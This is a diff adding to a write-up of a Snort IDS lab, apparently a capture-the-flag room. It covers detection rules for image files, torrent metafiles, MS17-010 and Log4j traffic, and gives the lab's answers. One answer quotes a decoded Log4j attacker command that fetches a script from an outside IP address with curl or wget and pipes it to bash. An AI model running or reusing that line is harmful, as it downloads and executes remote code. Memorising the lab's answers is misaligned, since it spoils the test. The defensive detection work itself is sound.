@@ -247,23 +247,314 @@ Then I used the newly created rule on the given pcap file:
 ---
 
 ### Writing IDS Rules (PNG)
+#### Question
+> Use the given pcap file.<br>
+> Write a rule to detect the PNG file in the given pcap.<br>
+> *Investigate the logs and identify the software name embedded in the packet.*
+
 #### Approach
+I know that every file has a file signature (aka *magic numbers* or *magic bytes*). PNG image files begin with an 8 byte signature that looks like ```89 50 4E 47 0D 0A 1A 0A```. You can look it up [here](https://en.wikipedia.org/wiki/List_of_file_signatures) for example.
+A png file is usually transmitted via TCP. With this information I created the following rule:
+
+```alert tcp any any <> any any (msg: "PNG found"; content: "|89 50 4E 47 0D 0A 1A 0A|"; sid: 10000001; rev:1;)```
+
+After that I executed snort with the newly created rule:
+
+```snort -r ftp-png-gif.pcap -c local.rules -A full -l .```
+
+![Result](screenshots\3_writing_ids_rules_(png)_screenshot_1.png)
+
+Then I inspected the created log file:
+
+```snort -r snort.log.1748545142 -X```
+
+![Result](screenshots\3_writing_ids_rules_(png)_screenshot_2.png)
+
+#### Answer
+> Adobe ImageReady
+---
+
+#### Question
+> Deactivate/comment on the old rule.<br>
+> Write a rule to detect the GIF file in the given pcap.<br>
+> *Investigate the logs and identify the image format embedded in the packet.*
+
+#### Approach
+There are two different gif file types. GIF87a has the file signature ```47 49 46 38 37 61```, GIF89a has the file signature ```47 49 46 38 39 61```. I then created the following two rules:
+
+```alert tcp any any <> any any (msg: "GIF87a"; content: "|47 49 46 38 37 61|"; sid: 10000001; rev:1;)```
+
+```alert tcp any any <> any any (msg: "GIF89a"; content: "|47 49 46 38 39 61|"; sid: 10000002; rev:1;)```
+
+I inspected the created ```alert``` file and received the answer to the question:
+
+![Result](screenshots\3_writing_ids_rules_(png)_screenshot_3.png)
+
+#### Answer
+> GIF89a
+---
 
 ### Writing IDS Rules (Torrent Metafile)
+#### Question
+> Use the given pcap file.<br>
+> Write a rule to detect the torrent metafile in the given pcap.<br>
+> *What is the number of detected packets?*
+
 #### Approach
+I couldn't find any magic number or file signature for torrent files. But torrent files usually ends with the file extension ```.torrent```. Then I created a rule that searches for the keyword ```torrent``` and tried it like this.
+
+```alert tcp any any <> any any (msg: "Torrent"; content: "torrent"; sid: 10000001; rev:1;)```
+
+![Result](screenshots\4_writing_ids_rules_(Torrent_Metafile)_screenshot_1.png)
+
+#### Answer
+> 2
+---
+
+#### Question
+> Investigate the log/alarm files.<br>
+> *What is the name of the torrent application?*
+
+#### Approach
+I looked at the generated log with the following command:
+
+```snort -r snort.log.1748545746 -X```
+
+In both packets where the alert was triggered you can see ```application/x-bittorrent```. This is the MIME type of the torrent and the actual name of the application is *bittorrent*.
+
+![Result](screenshots\4_writing_ids_rules_(Torrent_Metafile)_screenshot_2.png)
+
+#### Answer
+> bittorrent
+---
+
+#### Question
+> Investigate the log/alarm files.<br>
+> *What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?*
+
+#### Approach
+The answer to this question was already provided in the previous question.
+
+![Result](screenshots\4_writing_ids_rules_(Torrent_Metafile)_screenshot_2.png)
+
+#### Answer
+> application/x-bittorrent
+---
+
+#### Question
+> Investigate the log/alarm files.<br>
+> *What is the hostname of the torrent metafile?*
+
+#### Approach
+The answer to this question is in the generated log as well:
+
+![Result](screenshots\4_writing_ids_rules_(Torrent_Metafile)_screenshot_3.png)
+
+#### Answer
+> tracker2.torrentbox.com
+---
 
 ### Troubleshooting Rule Syntax Errors
+> **In this section, you need to fix the syntax errors in the given rule files.**<br>
+> You can test each ruleset with the following command structure:<br>
+> ```sudo snort -c local-X.rules -r mx-1.pcap -A console```<br>
+
+#### Question
+> Fix the syntax error in **local-1.rules** file and make it work smoothly.<br>
+> *What is the number of the detected packets?*
+
 #### Approach
+
+#### Answer
+> 16
+---
+
+#### Question
+> Fix the syntax error in **local-2.rules** file and make it work smoothly.<br>
+> *What is the number of the detected packets?*
+
+#### Approach
+
+#### Answer
+> 68
+---
+
+#### Question
+> Fix the syntax error in **local-3.rules** file and make it work smoothly.<br>
+> *What is the number of the detected packets?*
+
+#### Approach
+
+#### Answer
+> 87
+---
+
+#### Question
+> Fix the syntax error in **local-4.rules** file and make it work smoothly.<br>
+> *What is the number of the detected packets?*
+
+#### Approach
+
+#### Answer
+> 90
+---
+
+#### Question
+> Fix the syntax error in **local-5.rules** file and make it work smoothly.<br>
+> *What is the number of the detected packets?*
+
+#### Approach
+
+#### Answer
+> 155
+---
+
+#### Question
+> Fix the logical error in **local-6.rules** file and make it work smoothly to create alerts.<br>
+> *What is the number of the detected packets?*
+
+#### Approach
+
+#### Answer
+> 2
+---
+
+#### Question
+> Fix the logical error in **local-7.rules** file and make it work smoothly to create alerts.<br>
+> *What is the name of the required option:*
+
+#### Approach
+
+#### Answer
+> msg
+---
 
 ### Using External Rules (MS17-010)
+#### Question
+> Use the given pcap file.<br>
+> Use the given rule file (local.rules) to investigate the ms1710 exploitation.<br>
+> *What is the number of detected packets?*
+
 #### Approach
 
-### Using External Rules (Log4j)
+#### Answer
+> 25154
+
+#### Question
+> Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.<br>
+> *What is the number of detected packets?*
+
 #### Approach
 
+#### Answer
+> 12
+---
 
+#### Question
+> Investigate the log/alarm files.<br>
+> *What is the requested path?*
+
+#### Approach
+
+#### Answer
+> \\\192.168.116.138\IPC$
 
 ---
 
+#### Question
+> *What is the CVSS v2 score of the MS17-010 vulnerability?*
+
+#### Approach
+
+#### Answer
+> 9.3
+---
+
+
+### Using External Rules (Log4j)
+#### Question
+> Use the given pcap file.<br>
+> Use the given rule file (local.rules) to investigate the log4j exploitation.<br>
+> *What is the number of detected packets?*
+
+#### Approach
+
+#### Answer
+> 26
+---
+
+#### Question
+> Investigate the log/alarm files.<br>
+> *How many rules were triggered?*
+
+#### Approach
+
+#### Answer
+> 4
+---
+
+#### Question
+> Investigate the log/alarm files.<br>
+> *What are the first six digits of the triggered rule sids?*
+
+#### Approach
+
+#### Answer
+> 210037
+
+---
+
+#### Question
+> Use **local-1.rules** empty file to write a new rule to detect packet payloads **between 770 and 855 bytes**.<br>
+> What is the number of detected packets?
+
+#### Approach
+
+#### Answer
+> 41
+---
+
+#### Question
+> Investigate the log/alarm files.<br>
+> *What is the name of the used encoding algorithm?*
+
+#### Approach
+
+#### Answer
+> Base64
+---
+
+#### Question
+> Investigate the log/alarm files.<br>
+> *What is the IP ID of the corresponding packet?*
+
+#### Approach
+
+#### Answer
+> 62808
+---
+
+#### Question
+> Investigate the log/alarm files.<br>
+> Decode the encoded command.<br>
+> *What is the attacker's command?*
+
+#### Approach
+
+#### Answer
+> (curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
+---
+
+#### Question
+> *What is the CVSS v2 score of the Log4j vulnerability?*
+#### Approach
+
+#### Answer
+> 9.3
+---
+
+
 ## Tools and commands used
-_TODO: List tools
+- snort
+- grep
+- strings
